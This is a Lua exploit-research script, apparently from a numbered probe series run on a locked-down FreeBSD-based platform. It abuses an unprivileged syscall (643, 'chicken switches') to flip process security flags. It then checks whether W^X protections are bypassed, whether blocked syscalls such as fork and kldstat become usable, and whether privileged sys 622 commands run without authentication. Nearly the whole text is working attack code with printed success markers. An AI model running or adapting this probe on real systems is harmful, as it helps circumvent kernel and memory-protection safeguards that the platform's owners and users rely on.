-- CRASH_CLASS: MODERATE
-- PROBE 55a: sys 643 set_chicken_switches exploration
--
-- Context: PR #5 kernel handler RE reveals sys 643 is "set_chicken_switches":
--   process->field_0xa34 |= (uint32_t)arg0
-- with NO privilege check, NO bounds check, NO copyin.
-- It directly ORs user bits into a process struct field.
-- If +0xa34 is a debug/security flag, we might enable debug mode.
--
-- Plan:
-- A) Read process+0xa34 baseline via sysctl kinfo_proc (if accessible)
-- B) Call sys 643 with known bit patterns and observe behavior changes
-- C) Test each bit individually (32 bits) and check for side effects
-- D) After setting bits, check if previously-blocked syscalls now work
-- E) Check if mprotect(EXEC) behavior changes (security flag?)

print("=== PROBE 55a: CHICKEN SWITCHES (sys 643) ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local sc643 = make_syscall(643)
local sc202 = make_syscall(202)
local sc477 = make_syscall(477)
local sc588 = make_syscall(588)

-- [A] Baseline: call sys 643 with 0 (no-op OR)
print("[A] Baseline sys 643 call")
local ok, ret = pcall(function() return sc643(uint64(0)) end)
if ok then
    local h, l = get_hi_lo(ret)
    print("  ret=" .. l .. " (expect 0 for success)")
else
    print("  FAILED: " .. tostring(ret))
    print("  sys 643 not accessible, aborting")
    print("=== PROBE 55a DONE ===")
    return
end

-- [B] Get PID for later sysctl checks
local sc20 = make_syscall(20)
local ok_pid, pid_val = pcall(function() return sc20() end)
local pid = 0
if ok_pid then pid = to_num(pid_val) end
print("  PID: " .. pid)

-- [C] Test mprotect(EXEC) BEFORE setting any bits
print("")
print("[B] Baseline mprotect(EXEC) test")
local gpu = nil
do
    local ok_m, gpu_val = pcall(function()
        return sc477(uint64(0), uint64(0x4000), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if ok_m then
        gpu = gpu_val
        print("  GPU mmap: " .. hexval(gpu))
    else
        print("  GPU mmap failed")
    end
end

if gpu then
    local sc74 = make_syscall(74)
    local ok_mp, mp_ret = pcall(function()
        return sc74(gpu, uint64(0x4000), uint64(7))
    end)
    if ok_mp then
        local h, l = get_hi_lo(mp_ret)
        print("  mprotect(RWX) before chicken: ret=" .. l)
    else
        print("  mprotect(RWX) before chicken: CRASHED")
    end
end

-- [D] Set chicken switch bits and test effects
-- Start with individual bits to find which ones do something interesting
print("")
print("[C] Setting chicken switch bits one at a time")

local interesting_bits = {}

for bit = 0, 31 do
    local val = math.floor(2 ^ bit)
    -- On 14.10 the field might already have bits set, OR only adds
    local ok_c, ret_c = pcall(function() return sc643(uint64(val)) end)
    if ok_c then
        local h, l = get_hi_lo(ret_c)
        if l ~= 0 then
            print(string.format("  bit %d (0x%X): ret=%d NONZERO!", bit, val, l))
            table.insert(interesting_bits, bit)
        end
    else
        print(string.format("  bit %d (0x%X): CRASHED", bit, val))
        table.insert(interesting_bits, bit)
    end
end

if #interesting_bits == 0 then
    print("  All 32 bits returned ret=0 (success)")
else
    print("  Interesting bits: " .. table.concat(interesting_bits, ", "))
end

-- [E] Now set ALL bits (0xFFFFFFFF) to maximize effect
print("")
print("[D] Set all chicken switch bits (0xFFFFFFFF)")
local ok_all, ret_all = pcall(function() return sc643(uint64(0xFFFFFFFF)) end)
if ok_all then
    local h, l = get_hi_lo(ret_all)
    print("  ret=" .. l)
else
    print("  CRASHED: " .. tostring(ret_all))
end

-- [F] Re-test mprotect(EXEC) AFTER chicken switches
print("")
print("[E] Re-test mprotect(EXEC) after chicken switches")
if gpu then
    local sc74 = make_syscall(74)
    local ok_mp2, mp_ret2 = pcall(function()
        return sc74(gpu, uint64(0x4000), uint64(7))
    end)
    if ok_mp2 then
        local h, l = get_hi_lo(mp_ret2)
        print("  mprotect(RWX) after chicken: ret=" .. l)
        if l == 0 then
            print("  >>> W^X BYPASSED! mprotect(EXEC) now succeeds!")
        end
    else
        print("  mprotect(RWX) after chicken: CRASHED")
    end
end

-- [G] Re-test previously blocked syscalls after chicken switches
print("")
print("[F] Re-test blocked syscalls after chicken switches")

-- fork (2)
local sc2 = make_syscall(2)
local ok_f, ret_f = pcall(function() return sc2() end)
if ok_f then
    local h, l = get_hi_lo(ret_f)
    print("  fork: ret=" .. l)
    if l ~= 0xFFFFFFFF then
        print("  >>> FORK NOW WORKS!")
    end
else
    print("  fork: CRASHED")
end

-- kldstat (308) - was blocked before
local sc308 = make_syscall(308)
local kld_buf = memory.alloc(0x200)
safe_wd(kld_buf, 1)  -- version=1
safe_wd(kld_buf + 4, 1) -- id=1
local ok_k, ret_k = pcall(function() return sc308(uint64(kld_buf)) end)
if ok_k then
    local h, l = get_hi_lo(ret_k)
    print("  kldstat: ret=" .. l)
    if l == 0 then
        print("  >>> KLDSTAT NOW WORKS! Reading module info...")
        for off = 0, 0x40, 4 do
            local v = safe_rd(kld_buf + off)
            if v then print(string.format("    +0x%02X: 0x%08X", off, v)) end
        end
    end
else
    print("  kldstat: CRASHED")
end

-- ioctl (54) on /dev/null
local sc5 = make_syscall(5)
local ok_o, fd_val = pcall(function() return sc5(uint64(0), uint64(0), uint64(0x180)) end)
-- Try opening /dev/null first
print("")
print("[G] Test sys 622 unauthenticated commands (0x200 range)")
-- sys 622 has 300+ commands with no auth check per the RE
local sc622 = make_syscall(622)
local test_cmds = {0x200, 0x201, 0x210, 0x220, 0x230, 0x240, 0x250, 0x260, 0x270}
for _, cmd in ipairs(test_cmds) do
    local buf = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do safe_wd(buf + i, 0) end
    local ok_622, ret_622 = pcall(function()
        return sc622(uint64(cmd), uint64(0), uint64(buf), uint64(buf), uint64(0x40))
    end)
    if ok_622 then
        local h, l = get_hi_lo(ret_622)
        local first_dw = safe_rd(buf)
        print(string.format("  cmd 0x%X: ret=%d buf[0]=0x%X", cmd, l, first_dw or 0))
    else
        print(string.format("  cmd 0x%X: CRASHED", cmd))
    end
end

-- [H] Test sys 624 VM map field read
print("")
print("[H] sys 624 VM map field read")
local sc624 = make_syscall(624)
local ok_624, ret_624 = pcall(function() return sc624() end)
if ok_624 then
    print("  ret: " .. hexval(ret_624))
    -- Call twice to see if it changes
    local ok_624b, ret_624b = pcall(function() return sc624() end)
    if ok_624b then
        print("  ret (2nd call): " .. hexval(ret_624b))
    end
else
    print("  sys 624 CRASHED")
end

-- [I] Summary of process+0xa34 effect
print("")
print("[I] Final checks")
-- Try mprotect one more time on a fresh page
local ok_m2, gpu2 = pcall(function()
    return sc477(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if ok_m2 then
    local sc74 = make_syscall(74)
    -- Try PROT_EXEC only (4)
    local ok_exec, ret_exec = pcall(function()
        return sc74(gpu2, uint64(0x4000), uint64(4))
    end)
    if ok_exec then
        local h, l = get_hi_lo(ret_exec)
        print("  mprotect(EXEC only) on new page: ret=" .. l)
    end
    -- Try RWX (7)
    local ok_rwx, ret_rwx = pcall(function()
        return sc74(gpu2, uint64(0x4000), uint64(7))
    end)
    if ok_rwx then
        local h, l = get_hi_lo(ret_rwx)
        print("  mprotect(RWX) on new page: ret=" .. l)
    end
end

print("")
print("=== PROBE 55a COMPLETE ===")
